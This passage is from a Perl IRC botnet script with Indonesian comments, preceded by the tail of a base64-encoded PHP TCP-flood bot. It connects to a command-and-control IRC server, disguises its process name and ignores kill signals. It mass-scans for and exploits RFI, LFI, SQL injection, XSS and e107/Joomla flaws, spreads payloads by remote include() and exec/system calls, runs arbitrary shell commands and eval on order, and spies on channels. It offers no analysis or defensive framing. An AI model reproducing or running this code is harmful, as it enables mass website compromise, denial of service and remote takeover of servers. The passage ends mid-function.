kcG9ydCwkZGVsYXkpIA0KIHsgDQogICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCJbXDJUY3BGbG9vZCBTdGFydGVkIVwyXSIpOyANCiAgICAkcGFja2V0ID0gIiI7IA0KICAgIGZvcigkaT0wOyRpPCRwYWNrZXRzaXplOyRpKyspIA0KICAgICAgICRwYWNrZXQgLj0gY2hyKG10X3JhbmQoMSwyNTYpKTsgDQogICAgZm9yKCRpPTA7JGk8JHBhY2tldHM7JGkrKykgDQogICAgeyANCg0KDQogICAgICAgaWYoISRmcD1mc29ja29wZW4oInRjcDovLyIuJGhvc3QsJHBvcnQsJGUsJHMsNSkpIA0KICAgICAgIHsgDQogICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCJbXDJUY3BGbG9vZFwyXTogRXJyb3I6IDwkZT4iKTsgDQogICAgICAgICAgcmV0dXJuIDA7IA0KICAgICAgIH0gDQogICAgICAgZWxzZSANCiAgICAgICB7IA0KICAgICAgICAgIGZ3cml0ZSgkZnAsJHBhY2tldCk7IA0KICAgICAgICAgIGZjbG9zZSgkZnApOyANCiAgICAgICB9IA0KICAgICAgIHNsZWVwKCRkZWxheSk7IA0KICAgIH0gDQogICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCJbXDJUY3BGbG9vZCBGaW5pc2hlZCFcMl06IENvbmZpZyAtICRwYWNrZXRzIHBhY290ZXMgcGFyYSAkaG9zdDokcG9ydC4iKTsgDQogfQ0KfQ0KJGJvdCA9IG5ldyBwQm90OyANCiRib3QtPnN0YXJ0KCk7IA0K\"));;die();[/php]";

#$ebot         = ""; 

##[ KONFIGURASI IRC ]##
my @servers = ("f2011.knaqu.eu");
my @ports   = ("4244");
my @nickcrs = ("Scanner");
my %bot     = (
  nick    => $nickcrs[rand(scalar(@nickcrs))].-int(rand(10)).int(rand(10)),
  ident   => "Alb",
  chan    => "##linux##",
  server  => $servers[rand(scalar(@servers))],
  port    => $ports[rand(scalar(@ports))],
  passerv => ""
);


my $fakeproc      = "/usr/sbin/apache2-fork -x start"; 
$SIG{'INT'}       = 'IGNORE';
$SIG{'HUP'}       = 'IGNORE';
$SIG{'TERM'}      = 'IGNORE';
$SIG{'CHLD'}      = 'IGNORE';
$SIG{'PS'}        = 'IGNORE';
chdir("/tmp");
$0 = "$fakeproc"."\0"x16;;
my $pid = fork;
exit if $pid;


##[ KONFIGURASI USER ##
my %boss = (
   A => {
    pass   => 'yes',
    status => "admin",
    cryptz => 0,
    login  => 0
  }
);

##[ KONFIGURASI LOCAL ]##
my $rcetest  = "|echo%20%22Origins%22;echo%20%22scanner%22;|";
my $lfitest  = "../../../../../../../../../../../../../../../proc/self/environ%00";
my $xsslfitst= "../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././..";
my $lfiid2   = bukasitus($Ckrid2);
my $lfisprd  = bukasitus($spread);
my $lfisprd2 = bukasitus($spread2);
my $e107sprd = "include('".$spread."')";
my $e107sprd2= "passthru('".$e107cmdsp."');exec('".$e107cmdsp."');system('".$e107cmdsp."');shell_exec('".$e107cmdsp."');";
my $e107sprd3= "passthru('".$e107cmdsp2."');exec('".$e107cmdsp2."');system('".$e107cmdsp2."');shell_exec('".$e107cmdsp2."');";
my $e107sprd4= "passthru('".$e107cmdsp3."');exec('".$e107cmdsp3."');system('".$e107cmdsp3."');shell_exec('".$e107cmdsp3."');";
my $Originscmd= "http://www.freewebtown.com/origins/x.txt";
my $cmdlfiu  = "";
my $cmdrfiu  = "";
my $cmdxmlu  = "";
my $sqltest  = "'";
my $lfiUA    = "";

##[ KONFIGURASI SPY ]##
my %spy = (
  host   => "",
  chanz  => [""],
  wordz  => ['http://.+?[=]'],
  foundz => []
);

##[ KONFIGURASI BOT ]##
my %conf = (
  showsite => 0,
  showdbse => 0,
  linez    => 3,
  sleepz   => 3,
  rfipid   => 50,
  rficnt   => 100,
  rficnt2  => 200,
  timeout  => 15,
);

##[ KONFIGURASI WARNA ]##
my %colz = (
  1  => ""   , 2  => "2",
  3  => "3"  , 4  => "4",
  5  => "5"  , 6  => "6",
  7  => "7"  , 8  => "8",
  9  => "9"  , 10 => "10",
  11 => "11" , 12 => "12",
  13 => "13" , 14 => "14",
);

##[ PARAMETER BARIS PERINTAH ]##
$bot{chan}   = "#".$ARGV[0] if $ARGV[0];
$bot{server} = $ARGV[1] if $ARGV[1];
$bot{port}   = $ARGV[2] if $ARGV[2];

##[ INISIALISASI VARIABEL ]##
my $dbgchan  = "#Rom"; #For debugging purposes (Optional)
my @chans    = ($bot{chan});
my @badbugz  = ("scan","bug"); #Bad bugs to cancel scanning
my @baddorkz = ("dork"); #Bad dorks to cancel scanning
my @badlinkz = ("access*log","accesslog","awstats","error.log","wwwstats","google.com","yahoo.com"); #Bad links to exclude
my $keluar   = 0;
my $sock;

##[ PROGRAM UTAMA ]##
if (fork() == 0) {
  while ($keluar != 1) {irc_connect(); }
  die("KeLuaR!");
}

##[ SUBRUTIN KONEKSI IRC ]##
sub irc_connect {
  $sock = IO::Socket::INET->new(PeerAddr => $bot{server},
                                PeerPort => $bot{port},
                                Proto    => 'tcp')
                                or die "Error: Ga bisa connect ke ".$bot{server}.":".$bot{port}."!\r\n";
  $sock->autoflush(1);

  if ($bot{passerv} != "") {irc_pasv($bot{passerv});}
  irc_nick($bot{nick});
  irc_user($bot{ident});

  my ($baris,$hb);
  my $loginboss = 0;
  my $userstat  = "";

  while ( $baris = <$sock> ) {
    $hb++;

    ##[ PARSING ]##
    my $com;
    my $me = $bot{nick};
    my ($fcom,$dteks,@teks) = split(/\s+:/,$baris);
    my ($duhost,$dcom,$dtarget) = split(/ /,$fcom);
    my ($dnick,$dhost) = split(/!/,$duhost);
    $e107sprd2= "passthru('".$e107cmdsp."');exec('".$e107cmdsp."');system('".$e107cmdsp."');shell_exec('".$e107cmdsp."');";
    $e107sprd3= "passthru('".$e107cmdsp2."');exec('".$e107cmdsp2."');system('".$e107cmdsp2."');shell_exec('".$e107cmdsp2."');";
    $e107sprd4= "passthru('".$e107cmdsp3."');exec('".$e107cmdsp3."');system('".$e107cmdsp3."');shell_exec('".$e107cmdsp3."');";
    
    $dcom    = "" unless ($dcom);
    $dtarget = "" unless ($dtarget);
    $dnick =~ s/://;
    $dteks = trimrn($dteks);
    if ($dteks =~ /^[$cmdpre](.*)/) { $com = $1; } else { $com = ""; }

    ##[ CEK USER ]##
    if   ($boss{$dnick}) { ($loginboss,$userstat) = ($boss{$dnick}{"login"},$boss{$dnick}{"status"}); }
    else { ($loginboss,$userstat) = (0,""); }

    ##[ RESPON KE SERVER ]##
    if    ($dnick =~ /PING/) { irc_raw("PONG $dteks"); }
    if    ($dcom =~ /001/) { irc_join($bot{chan}); sleep(1); irc_join($dbgchan); sleep(1); foreach my $c (@chans) { irc_join($c); sleep(1); } if ((fork() == 0) && ($bot{server} !~ /allnetwork/)) { crsql_scanz("#crack","contact.php",$dorxz,$hb,3,2); exit; } }
    elsif ($dcom =~ /NICK|PART|QUIT/) { if ( $boss{$dnick}{"login"} == 1 ) { $boss{$dnick}{"login"} = 0; irc_ntc($dnick,"Logout!");  } }

    ##[ PERINTAH PUBLIK ]##
    if    (($dtarget) && ($dtarget eq $me)) { $dtarget = $dnick; }
    if      (($dteks =~ /$bot{nick}\s+(.+?)\s+(.*)/) && ( fork() == 0 )){
    my ($cmdcr,$crcmd)=($1,$2);
    my $crscan = $cmdcr." ".$crcmd;
        my $cmd = "python Origins ".$crcmd;
    if($cmdcr =~ /sqli/){
      irc_msg($dtarget,"Procesing [".$colz{3}."SQLI".$colz{1}."] ".$colz{14}.$crcmd);
          if ($cmd =~ /;/)   { irc_msg($dtarget,$colz{5}."Error!"); return; }
          else{
            my @output = `$cmd`;
            my $i = 0;
            foreach my $out (@output) {
              $i++; if ($i % $conf{linez} == 0) { sleep($conf{sleepz}); }
              irc_msg($dtarget,$colz{7}."$out");
            }
           exit;
      }
    }
    elsif($crscan =~ /sql\s+(.+?[=])\s+(.*)/)    { if ($dtarget && $dtarget ne $me) { crsql_scanz($dtarget,$1,$2,$hb,1,1); exit;  }}
    elsif($crscan =~ /domxml\s+(.+?)\s+(.*)/)    { if ($dtarget && $dtarget ne $me) { crsql_scanz($dtarget,$1,$2,$hb,2,2); exit;  }}
    elsif($crscan =~ /xml\s+(.+?)\s+(.*)/)        { if ($dtarget && $dtarget ne $me) { crsql_scanz($dtarget,$1,$2,$hb,2,1); exit;  }}
    elsif($crscan =~ /xss\s+(.+?[=])\s+(.*)/)    { if ($dtarget && $dtarget ne $me) { crsql_scanz($dtarget,$1,$2,$hb,4,1); exit;  }}
    elsif($crscan =~ /dome107\s+(.+?)\s+(.*)/)    { if ($dtarget && $dtarget ne $me) { crsql_scanz($dtarget,$1,$2,$hb,3,2); exit;  }}
    elsif($crscan =~ /e107\s+(.+?)\s+(.*)/)        { if ($dtarget && $dtarget ne $me) { crsql_scanz($dtarget,$1,$2,$hb,3,1); exit;  }}
    elsif($crscan =~ /domscan\s+(.+?[=])\s+(.*)/)    { if ($dtarget && $dtarget ne $me) { s_scanz($dtarget,$1,$2,$hb,2,2); exit;    }}
    elsif($crscan =~ /scan\s+(.+?[=])\s+(.*)/)    { if ($dtarget && $dtarget ne $me) { s_scanz($dtarget,$1,$2,$hb,2,1); exit;    }}
    }
    if    ($com =~ /^help$/) { bot_help($dtarget,1); }
    elsif ($com =~ /^info$/) { bot_info($dtarget); }
    elsif ($com =~ /^url(en|de)\s+(.*)/) {
      my $url = $2; my $en;
      if    ( $1 eq "en" ) { $en = "Encode"; $url = urlen($url); }
      elsif ( $1 eq "de" ) { $en = "Decode"; $url = urlde($url); }
      msgi($dtarget,$colz{3}."URL".$colz{8}." $en",$colz{7}.$url);
    }
    elsif ($com =~ /^cek\s+(http:\/\/.*[=])/) { cek_shell($dtarget,$dnick,$1); }
    ###
    elsif ($com =~ /^ip\s+(.*)/) { cr_ipcek($dtarget,$1); }
    elsif ($com =~ /^zip\s+(.*)/) { cr_zipcek($dtarget,$1); }
    elsif ($com =~ /^textenc\s+(.*)/) { cr_encrypt($dtarget,$1); }
    elsif ($com =~ /^textdec\s+(.*)/) { cr_decrypt($dtarget,$1); }
    ###
    elsif ($com =~ /^respon/) { cek_respon($dtarget); }
    elsif ($com =~ /^milw0rm\s+(.*)/) { milw0rm($dtarget,$1); }
    elsif ($com =~ /^auth$|auth\s+(.*)/ && $boss{$dnick}) {
      my $pass = $1; my $auth = $boss{$dnick}{"login"};
      if ( $pass && $auth == 0 ) {
        if ($boss{$dnick}{"cryptz"} == 1) { $pass = cryptz($pass); }
        if ($pass eq $boss{$dnick}{"pass"}) {
          $boss{$dnick}{"login"} = 1;
          irc_ntc($dnick,"OK ".$boss{$dnick}{"status"}."!");
        }
        else { irc_ntc($dnick,"Error!"); }
      }
      else {
        if ($auth == 0) { irc_ntc($dnick,"Blom auth!"); }
        else { irc_ntc($dnick,$boss{$dnick}{"status"}."!"); } }
    }
    if ($dtarget && $dtarget ne $me) {
      if    (($com =~ /^scan\s+(.+?[=])\s+(.*)/) && (fork() == 0))  { s_scanz($dtarget,$1,$2,$hb,1,1); exit;  }
      elsif (($com =~ /^scan2\s+(.+?[=])\s+(.*)/) && (fork() == 0)) { s_scanz($dtarget,$1,$2,$hb,2,1); exit;  }
      elsif (($com =~ /^cmdlfi\s+(.+?[=])\s+(.*)/))             { irc_msg($dtarget,$colz{14}."Cek target ".$colz{8}.$dnick.".!"); cmd_lfi($dtarget,$1,$2); }
      elsif (($com =~ /^cmdrfi\s+(.+?[=])\s+(.*)/))             { irc_msg($dtarget,$colz{14}."Cek target ".$colz{8}.$dnick.".!"); cmd_rfi($dtarget,$1,$2); }
      elsif (($com =~ /^cmdxml\s+(.+?)\s+(.*)/))             { irc_msg($dtarget,$colz{14}."Cek target ".$colz{8}.$dnick.".!"); cmd_xml($dtarget,$1,$2); }
      elsif (($com =~ /^cmde107\s+(.+?)\s+(.*)/))             { irc_msg($dtarget,$colz{14}."Cek target ".$colz{8}.$dnick.".!"); cmd_e107($dtarget,$1,$2); }
    }
    ##[ END OF PUBLIC ]##

    ##[ PERINTAH USER ]##
    if ($loginboss == 1) {
      if    ($com =~ /^help/) { bot_help($dtarget,2); }
      elsif ($com =~ /^join\s+(.*)/) { irc_join($1); push(@chans,$1); }
      elsif ($com =~ /^part\s+(.*)/) {
        my $pchan = $1; irc_part($1);
        for my $i(0..scalar(@chans)) { if ($chans[$i] eq $pchan) { undef $chans[$i]; } }
      }
      elsif ($com =~ /^nick\s+(.*)/) { $bot{nick} = $1; irc_nick($bot{nick}); }
      elsif ($com =~ /^hitung\s+([0-9].*)/) { $conf{rficnt} = $1; msgi($dtarget,$colz{14}."Count",$colz{8}.$conf{rficnt}); }
      elsif ($com =~ /^bos$/ ) { my @bos = keys %boss; my $bos2 = join(" ",@bos); msgi($dtarget,$colz{14}."BoZz",$colz{8}.$bos2); }
      elsif ($com =~ /^cryptz\s+(.*)/) { msgi($dnick,$colz{14}.$1,$colz{3}." ".cryptz($1)); }
      elsif ($com =~ /^logout$/ ) { $boss{$dnick}{"login"} = 0; irc_ntc($dnick,"Logout berhasil!"); }
      elsif (($com =~ /^joomla\s+(.*)/) && (fork() == 0)) { s_scanz($dtarget,"",$1,$hb,3,1); exit; }
      elsif ($com =~ /^sublink\s+(.*)/) { my @sl = lnk_sub($1); foreach my $e(@sl) { irc_msg($dtarget,$colz{8}." ".$e); } }
      elsif ($com =~ /^http(1|2|3)\s+(.+?)\s+(.*)/) {
        my ($t,$nf,$q) = ($1,$2,$3);
        my $h;
        if ($t == 1) { $h = bukasitus($q); }
        elsif ($t == 2) { $h = bukasitus2($q); }
        else { $h = bukasitus3($q); }
        f_simpan2($nf,$h); ntci($dnick,"SaVeD ($t)",$nf);
      }
      elsif ($com =~ /^regex(1|2)\s+(.+?)\s+(.*)/) {
        my $n = $1;
        my $q = bukasitus($2);
        my $regex = $3;
        if ($n ==1) {
          if ($q !~ /$regex/) { irc_msg($dtarget,$colz{5}."Ga cocok!"); }
          while ($q =~ m/$regex/g ) { irc_msg($dtarget,$colz{5}." ".$1); sleep(1); }
        }
        else {
          while ($q =~ m/<a href=\"(.*?)\">http:\/\/(.*?)<\/a>/g) { irc_msg($dtarget,$colz{3}." ".$2); sleep(1); }
        }
      }
    }
    ##[ END OF USER ]##

    ##[ PERINTAH ADMIN ]##
    if (($loginboss == 1) && ($userstat eq "admin")) {
      if    ($com =~ /^help/) { bot_help($dtarget,3); }
      elsif ($com =~ /^chans/) { my $chans = join(",", @chans); ntci($dnick,"ChaNz",$chans);  }
      ##[ PERINTAH SPY ]##
      elsif ($com =~ /^spy$/ ) { ntci($dnick,"SpY","Host: ".$spy{"host"}." Chans: ".join(",", @{ $spy{"chanz"} })." Words: ".join(",", @{ $spy{"wordz"} })); }
      elsif ($com =~ /^spy(found|show|clear)$/ ) {
        my $n = $1;
        if ($n eq "found") { msgi($dtarget,$colz{14}."SpYFouNd",$colz{8}." ".scalar(@{ $spy{"foundz"} })); }
        elsif ($n eq "show") {
          my $i = 0;
          for my $f (@{ $spy{"foundz"} }) { irc_msg($dtarget,$colz{8}." ".$f); }
          $i++; if ($i % $conf{linez} == 0) { sleep($conf{sleepz}); }
        }
        elsif ($n eq "clear") { $spy{"foundz"} = []; msgi($dtarget,$colz{14}."SpyList",$colz{8}."DiBersiHkaN!"); }
        else { msge($dtarget,$colz{14}."Spy",$colz{14}."PeRinTah SaLah!"); }
      }
      elsif ($com =~ /^spyhost\s+(.*)/ ) { $spy{"host"} = $1; ntci($dnick,"SpYHosT",$spy{"host"}); }
      elsif ($com =~ /^spychan\s+(.*)/ ) {
        unless ($spy{"host"}) { msge($dtarget,$colz{8}."SiLaHkaN SeT SpyHost TerLebih DahuLu!",""); }
        else{ irc_join($1); push @{ $spy{"chanz"} }, $1; my $chans = join(",", @{ $spy{"chanz"} }); ntci($dnick,"SpYChaNz",$chans); }
      }
      elsif ($com =~ /^spyword\s+(.*)/ ) { push @{ $spy{"wordz"} }, $1; my $words = join(",", @{ $spy{"wordz"} }); ntci($dnick,"SpYWoRDz",$words); }
      ##[ END OF PERINTAH SPY ]##
      elsif ($com =~ /^quit/) { irc_quit("Good Bye!"); $keluar = 1; exit; }
      elsif ($com =~ /^keluar/) { irc_quit("Killed!"); $keluar = 1; system("killall perl"); exit; }
      elsif ($com =~ /^raw\s+(.*)/) { irc_raw($1); }
      elsif ($com =~ /^rfipid\s+([0-9].*)/) { $conf{rfipid} = $1; msgi($dtarget,$colz{14}."Pid",$colz{8}." ".$conf{rfipid}); }
      elsif ($com =~ /^crespon(1|2)\s+(.*)/) {
        my ($n,$url) = ($1,$2);
        if    ($n == 1) { $Ckrid = $url; }
        elsif ($n == 2) { $Ckrid2 = $url; }
        msgi($dtarget,$colz{14}."Respon $n RFI",$colz{7}.$url);
      }
      elsif ($com =~ /^cspread1\s+(.*)/) {
        my $url = $1;
        $spread = $url;
    $lfisprd = bukasitus($spread);$lfisprd2 = bukasitus($spread2);
    $e107sprd = "include('".$spread."')";
        msgi($dtarget,$colz{14}."Spread",$colz{14}.$spread);
      }
      elsif ($com =~ /^cspread2\s+(.*)/) {
        my $url = $1;
        $spread2 = $url;
    $lfisprd = bukasitus($spread);$lfisprd2 = bukasitus($spread2);
        msgi($dtarget,$colz{14}."Spread2",$colz{14}.$spread2);
      }
      elsif ($com =~ /^cmdspread\s+(.*)/) {
        my $url = $1;
    $e107cmdsp = $url;
        msgi($dtarget,$colz{14}."cmdSpread",$colz{7}.$url);
      }
      elsif ($com =~ /^cmdspread2\s+(.*)/) {
        my $url = $1;
    $e107cmdsp2 = $url;
        msgi($dtarget,$colz{14}."cmdSpread2",$colz{7}.$url);
      }
      elsif ($com =~ /^cshurl\s+(.*)/) {
    my $url  = $1."/";
    $Ckrid   = $url."Ckrid1.txt?";
    $Ckrid2  = $url."Ckrid2.txt?";
    $spread  = $url."Origins.txt?";
    $spread2 = $url."Origins2.txt?";
    $e107sprd= "include('".$url."Origins.txt?"."')";
    $lfisprd = bukasitus($url."Origins.txt?");
    $lfisprd2= bukasitus($url."Origins2.txt?");
    msgi($dtarget,$colz{14}."shurl",$colz{7}.$url);
      }
      elsif ($com =~ /^\+bos\s+(.+?)\s+(.*)/) {
        $boss{$1}{pass}   = "cr";
        $boss{$1}{status} = $2;
        $boss{$1}{login}  = 0;
        $boss{$1}{cryptz} = 0;
        ntci($dnick,"BoZz","$1 ditambahkan sbg ".$boss{$1}{status});
        msgi($1,"BoZz","Hai $1! Ketik .auth ".$boss{$1}{pass});
      }
      elsif ($com =~ /^eval\s+(.*)/) { eval($1); }
      elsif (( $com =~ /^cmd\s+(.*)/) && ( fork() == 0 ) ) {
        my $cmd = $1;
        if ($cmd =~ /cd (.*)/) { chdir("$1") || irc_msg($dtarget,$colz{5}."Ga bisa ganti dir!"); return; }
        my @output = `$cmd`;
        my $i = 0;
        foreach my $out (@output) {
          $i++; if ($i % $conf{linez} == 0) { sleep($conf{sleepz}); }
          irc_msg($dtarget,$colz{14}."$out");
        }
        exit;
      }
    }
    ## END OF ADMIN ##

    ##[ MATA-MATA ]##
    if ($dtarget ne $spy{"host"}) {
      my $is_spychan = grep $_ eq $dtarget, @{$spy{"chanz"}};
      if ($is_spychan == 1) {
         for my $t (@{$spy{"wordz"}}) {
           if ($dteks =~ /$t/) {
             msgi($spy{"host"},"!",$dteks); sleep(1);
             push @{ $spy{"foundz"} }, $dteks;
           }
         }
       }
    }
    ##[ END OF MATA-MATA ]##
  }
  ## END WHILE ##
}
## END KONEK ##

#########################
##[ RUTIN EKSPLOITASI ]##
#########################
sub s_scanz {
  my ($to,$bug,$dork,$sb,$type,$autodom) = @_;
  $sb = "cr".$sb.".txt";
  $dork = bersihdork($to,$dork);
  my @domini = SiteDomains();

  if($autodom == 1){
  my %typez = (
    1 => "RFI & LFI & XML & SQL ScaNneR",
    2 => "RFI & LFI & XML & SQL ScaN & ExpLoiT",
    3 => "JooMLa MaSs ScaN & ExpLoiT"
  );
  my $badbug  = cek_bug($bug);
  if ($badbug == 1)  { irc_msg($to,$colz{5}."BuGnya JeLek!".$colz{6}." ScaNNinG DiCanCeL"); return; }
  my $baddork = cek_dork($dork);
  if ($baddork == 1) { irc_msg($to,$colz{5}."DorKnya JeLek!".$colz{6}." ScaNNinG DiCanCeL"); return; }
  if ($type == 3) {
    my $h = bugjoomla("hitung");
    if ($h == 0) { msge($to,"Joomla",$colz{5}."BuGnya Ga BiSa DiLoaD!".$colz{6}." ScaNNinG DiCanCeL"); return; }
  }
  irc_msg($to,$colz{3}."MeMeRikSa ReSpoN..");
  my $stat = cek_respon($to);
  if ($stat != 2) { irc_msg($to,$colz{5}."ReSpoN Ga BeKerJa!".$colz{6}." ScaNning diCaNCeL!"); return; }

  irc_msg($to,$colz{5}.$typez{$type}." DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{5}." $sb");

  irc_msg($to,$colz{10}."BuGz:".$colz{4}." $bug ") if ($type != 3);
  irc_msg($to,$colz{10}."DoRkz:".$colz{4}." $dork ");
  s_cari($to,$dork,$sb,$bug,$type);
  s_eksploit(1,$to,$bug,$dork,$sb) if ($type == 1);
  irc_msg($to,$colz{5}.$typez{$type}." SeLeSai!".$colz{3}." $dork ".$colz{1}."ID: $sb");
  return;
  }
  elsif($autodom == 2){
  foreach my $Domains(@domini){


  my %typez = (
    1 => "Auto DorkZ RFI & LFI & XML & SQL ScaNneR",
    2 => "Auto DorkZ RFI & LFI & XML & SQL ScaN & ExpLoiT",
    3 => "Auto DorkZ JooMLa MaSs ScaN & ExpLoiT"
  );
  my $badbug  = cek_bug($bug);
  if ($badbug == 1)  { irc_msg($to,$colz{5}."BuGnya JeLek!".$colz{6}." ScaNNinG DiCanCeL"); return; }
  my $baddork = cek_dork($Domains." ".$dork);
  if ($baddork == 1) { irc_msg($to,$colz{5}."DorKnya JeLek!".$colz{6}." ScaNNinG DiCanCeL"); return; }
  if ($type == 3) {
    my $h = bugjoomla("hitung");
    if ($h == 0) { msge($to,"Joomla",$colz{5}."BuGnya Ga BiSa DiLoaD!".$colz{6}." ScaNNinG DiCanCeL"); return; }
  }
  irc_msg($to,$colz{3}."MeMeRikSa ReSpoN..");
  my $stat = cek_respon($to);
  if ($stat != 2) { irc_msg($to,$colz{5}."ReSpoN Ga BeKerJa!".$colz{6}." ScaNning diCaNCeL!"); return; }

  irc_msg($to,$colz{5}.$typez{$type}." DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{5}." $sb");

  irc_msg($to,$colz{10}."BuGz:".$colz{4}." $bug ") if ($type != 3);
  irc_msg($to,$colz{10}."DoRkz:".$colz{4}." ".$Domains." ".$dork);
  s_cari($to,$Domains." ".$dork,$sb,$bug,$type);
  s_eksploit(1,$to,$bug,$Domains." ".$dork,$sb) if ($type == 1);
  irc_msg($to,$colz{5}.$typez{$type}." SeLeSai!".$colz{3}." ".$Domains." ".$dork.$colz{1}." ID: $sb");

  }
  return;
  }
}

sub crsql_scanz {
  my ($to,$bug,$dork,$sb,$type,$autodom) = @_;
  $sb = "cr".$sb.".txt";
  $dork = bersihdork($to,$dork);
  my @domini = SiteDomains();
  if($autodom == 1){
  if ($type == 1){
  my $badbug  = cek_bug($bug);
  if ($badbug == 1)  { irc_msg($to,$colz{5}."BuGnya JeLek!".$colz{6}." ScaNNinG DiCanCeL"); return; }
  }
  my $baddork = cek_dork($dork);
  if ($baddork == 1) { irc_msg($to,$colz{5}."DorKnya JeLek!".$colz{6}." ScaNNinG DiCanCeL"); return; }
  if ($type == 1){
  irc_msg($to,$colz{10}.$colz{5}."SQL ScaN & ExpLoiT DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{5}." $sb");
  crsql_cari($to,$bug,$dork,$sb,1);
  }
  if ($type == 2){
  irc_msg($to,$colz{10}.$colz{5}."XML ScaN & ExpLoiT DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{5}." $sb");
  crsql_cari($to,$bug,$dork,$sb,2);
  }
  if ($type == 3){
  irc_msg($to,$colz{10}.$colz{5}."e107 ScaN & ExpLoiT DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{5}." $sb");
  crsql_cari($to,$bug,$dork,$sb,3);
  }
  if ($type == 4){
  irc_msg($to,$colz{10}.$colz{5}."XSSLFI ScaN & ExpLoiT DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{5}." $sb");
  crsql_cari($to,$bug,$dork,$sb,4);
  }

  irc_msg($to,$colz{10}."BuGz:".$colz{4}." $bug ");
  irc_msg($to,$colz{10}."DoRkz:".$colz{4}." $dork ");

  if ($type == 1){ irc_msg($to,$colz{7}."SQL ScaN & ExpLoiT SeLeSai!".$colz{3}." $dork ".$colz{1}."ID: $sb"); }
  if ($type == 2){ irc_msg($to,$colz{7}."XML ScaN & ExpLoiT SeLeSai!".$colz{3}." $dork ".$colz{1}."ID: $sb"); }
  if ($type == 3){ irc_msg($to,$colz{7}."e107 ScaN & ExpLoiT SeLeSai!".$colz{3}." $dork ".$colz{1}."ID: $sb"); }
  if ($type == 4){ irc_msg($to,$colz{7}."XSSLFI ScaN & ExpLoiT SeLeSai!".$colz{3}." $dork ".$colz{1}."ID: $sb"); }
  return;
  }

  elsif($autodom == 2){
  foreach my $Domains(@domini){
  if ($type == 1){
  my $badbug  = cek_bug($bug);
  if ($badbug == 1)  { irc_msg($to,$colz{5}."BuGnya JeLek!".$colz{6}." ScaNNinG DiCanCeL"); return; }
  }

  my $baddork = cek_dork($Domains." ".$dork);
  if ($baddork == 1) { irc_msg($to,$colz{5}."DorKnya JeLek!".$colz{6}." ScaNNinG DiCanCeL"); return; }
  if ($type == 1){
  irc_msg($to,$colz{10}.$colz{5}."Auto DorkZ SQL ScaN & ExpLoiT DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{5}." $sb");
  crsql_cari($to,$bug,$Domains." ".$dork,$sb,1);
  }
  if ($type == 2){
  irc_msg($to,$colz{10}.$colz{5}."Auto DorkZ XML ScaN & ExpLoiT DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{5}." $sb");
  crsql_cari($to,$bug,$Domains." ".$dork,$sb,2);
  }
  if ($type == 3){
  irc_msg($to,$colz{10}.$colz{5}."Auto DorkZ e107 ScaN & ExpLoiT DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{5}." $sb");
  crsql_cari($to,$bug,$Domains." ".$dork,$sb,3);
  }
  if ($type == 4){
  irc_msg($to,$colz{10}.$colz{5}."XSSLFI ScaN & ExpLoiT DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{5}." $sb");
  crsql_cari($to,$bug,$Domains." ".$dork,$sb,4);
  }

  irc_msg($to,$colz{10}."BuGz:".$colz{4}." $bug ");
  irc_msg($to,$colz{10}."DoRkz:".$colz{4}." ".$Domains." ".$dork);

  if ($type == 1){ irc_msg($to,$colz{7}."Auto DorkZ SQL ScaN & ExpLoiT SeLeSai!".   $colz{14}." ".$Domains." ".$dork." ".$colz{1}."ID: $sb"); }
  if ($type == 2){ irc_msg($to,$colz{7}."Auto DorkZ XML ScaN & ExpLoiT SeLeSai!".   $colz{14}." ".$Domains." ".$dork." ".$colz{1}."ID: $sb"); }
  if ($type == 3){ irc_msg($to,$colz{7}."Auto DorkZ e107 ScaN & ExpLoiT SeLeSai!".  $colz{14}." ".$Domains." ".$dork." ".$colz{1}."ID: $sb"); }
